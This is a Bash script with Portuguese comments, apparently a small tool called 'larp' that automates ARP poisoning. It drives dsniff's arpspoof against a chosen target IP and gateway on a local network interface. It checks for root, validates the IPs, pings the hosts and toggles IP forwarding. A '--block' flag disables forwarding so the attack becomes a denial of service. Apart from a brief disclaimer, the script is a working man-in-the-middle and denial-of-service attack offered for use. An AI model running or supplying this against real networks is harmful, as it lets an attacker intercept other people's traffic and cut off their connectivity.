#!/bin/bash

# Este simples script facilita um pouco a aplicação da técnica de envenenamento ARP
# Utiliza o programa arpspoof disponível no pacote dsniff

# Eu não me responsabilizo pela má utilização desta ferramenta
# Não utilize-a em organizações militares ou privadas
# Autor: Lucas Vieira de Jesus <lucas.engen.cc@gmail.com>
# Data: 25/06/2018

# Variáveis globais
caminho='/proc/sys/net/ipv4/ip_forward'
ip_alvo=""
ip_roteador=""
resposta=""
interface=""
lista_interfaces=""
RED='\x1b[1;31m'
GREEN='\x1b[1;32m'
YELLOW='\x1b[1;33m'
BLUE='\x1b[1;34m'
MAGENTA='\x1b[1;35m'
CYAN='\x1b[1;36m'
RESET='\x1b[0m'
COLS="$(tput cols)"
LINES="$(tput lines)"
AUTHOR="Lucas Vieira"
V_MAJOR="1"
V_MINOR="0"
V_PATCH="2"
TAMANHO_LINHA=62

# Parâmetros usados na linha de comando
p1="-a"
p2="-d"
p3="--block"
p4="-i"
flag1="true"
flag2="false"

# Subrotinas
function log_alerta()
{
	echo -e "${YELLOW}[!]${RESET} $1"
}

function log_err()
{
	echo -e "${RED}[!]${RESET} $1"
}

function log_info()
{
	echo -e "${BLUE}[*]${RESET} $1"
}

function log_ok()
{
	echo -e "${GREEN}[+]${RESET} $1"
}

function log_pergunta()
{
	echo -e "${YELLOW}[?]${RESET} $1"
}

function log_show()
{
	echo -e "${RED}[*]${RESET} $1"
}

function verifica_ip_forward()
{
	desativar="$1"

	# Configura o repasse dos pacotes
	if [ "$desativar" == "$flag1" ]; then
		# Deverá ser feito uma negação de serviço
		log_info "Desabilitando o repasse de pacotes ..."
		echo 0 > $caminho
	else
		log_info "Ativando o repasse de pacotes ..."
		echo 1 > $caminho
	fi
}

function checa_host
{
	ping -q -c 4 -b $1 > /dev/null
	if [ "$?" == "2" ]; then
		log_err "Ip incorreto\n"
		exit $?
	fi
	
	if [ "$?" != "0" ]; then
		log_err "Erro ao conectar-se ao host.\n"
		exit $?
	fi
	
	log_ok "Host online: $1"
}

function get_interfaces()
{
	path="/sys/class/net"

	# Listar interfaces de rede
	interfaces="$(ls $path)"
	if [ "$?" != "0" ]; then
		log_err "Um erro ocorreu. Nao foi possivel listar as interfaces disponiveis"
		exit 1
	fi

	log_ok "Interfaces de rede encontradas:\n"
	for folder in $path/*; do
		interface_name=$(basename $folder)
		if [ -d "$folder/wireless" ]; then
			log_info "$interface_name [Sem fio]"
		else
			log_info "$interface_name"
		fi
	done

	echo -e "\n"
}

function interface_existe()
{
	path="/sys/class/net"

	result="$(find $path/$1 2>&1)"
	if [ "$?" != 0 ]; then
		log_err "A interface de rede '$1' não existe\n"
		exit 1
	fi
}

function mostra_dependencias()
{
	log_show "dnsniff ==> arpspoof"
	desenha_linha_horizontal $TAMANHO_LINHA
	echo -e "\n"
}

function resetar_configs_pacotes_ipv4()
{
	log_info "Desabilitando o repasse de pacotes ..."
	echo 0 > $caminho
}

function desenha_linha_horizontal()
{
	for i in `seq 1 $1`;
	do
		echo -n "_"
	done
}

function mostra_banner()
{
	caminho_shell_32_dll="c:\\windows\\system32\\shell32.dll"
	desenha_linha_horizontal $TAMANHO_LINHA
	echo ""
	log_show "larp v$V_MAJOR.$V_MINOR.$V_PATCH - ferramenta para realizar envenenamento ARP"
	log_show "Autor: $AUTHOR"
	log_show "Data: 25/06/2018"
	log_show "Dependencias:"
	mostra_dependencias
	if [ -f $caminho_shell_32_dll ]; then
		log_err "Estou no windows, mas fui escrito para o Linux :("
		exit 1
	fi
}

function exibe_uso()
{
	echo -e "\n"
	log_info "Uso: $YELLOW$0$RESET $GREEN$p4$RESET <interface> $GREEN$p1$RESET <ip> $GREEN$p2$RESET <ip> $GREEN$p3$RESET [$GREEN $flag1$RESET |$RED $flag2$RESET]\n"
	log_info "\t$p4: Interface de rede a ser utilizada"
	log_info "\t$p1: Endereço de IP do alvo a ser interceptado"
	log_info "\t$p2: Endereço IP destino dos pacotes enviados pelo alvo"
	log_info "\t$p3: Bloquear os pacotes de rede (Denial Of Service)\n"

	# Exibe as interfaces de rede disponíveis
	get_interfaces
}

function validate_ip
{
	ip=$1
	echo $ip | grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"
}

function analisa_argumentos()
{
	if [ "$1" != "$p4" ] || [ "$3" != "$p1" ] || [ "$5" != "$p2" ] || [ "$7" != "$p3" ]; then
		log_err "Linha de comando incorreta"
		return 1
	fi

	if [ "$8" != "$flag1" ] && [ "$8" != "$flag2" ]; then
		log_err "Parâmetro inválido: $8"
		return 1
	fi
}

function main()
{
	alvo1=$4
	alvo2=$6
	flag_dos=$8
	interface=$2

	log_info "Iniciando o larp ..."
	if [ "$UID" != "0" ]; then
		log_err "Eu preciso ser root"
		exit 1
	fi

	# Verifica se a interface especificada existe
	interface_existe $interface

	# Certifica-se de que o endereço dos alvos é válido
	alvo1="$(validate_ip $alvo1)"
	alvo2="$(validate_ip $alvo2)"

	log_info "Checando alvos ..."
	checa_host $alvo1
	checa_host $alvo2

	# IP Forwarding
	verifica_ip_forward $flag_dos

	log_ok "Aplicando o envenenamento ARP ao alvo '$alvo1' ..."
	envenenamento="$(arpspoof -i $interface -t $alvo1 -r $alvo2)"
	if [ "$?" != "0" ]; then
		log_err "O ataque falhou. Verifique se o pacote dsniff foi instalado"
	else
		log_ok "O ataque foi terminado com sucesso\n"
	fi
	resetar_configs_pacotes_ipv4
}

# Verifica se os argumentos foram fornecidos corretamente
if [ $# -ne 8 ]; then
	exibe_uso
	exit 1
fi

# Analisa os argumentos fornecidos
analisa_argumentos $1 $2 $3 $4 $5 $6 $7 $8
if [ $? -ne 0 ]; then
	log_err "Argumento(s) inválido(s) passado(s) para o script"
	exit 1
fi

# Início
mostra_banner
main $1 $2 $3 $4 $5 $6 $7 $8
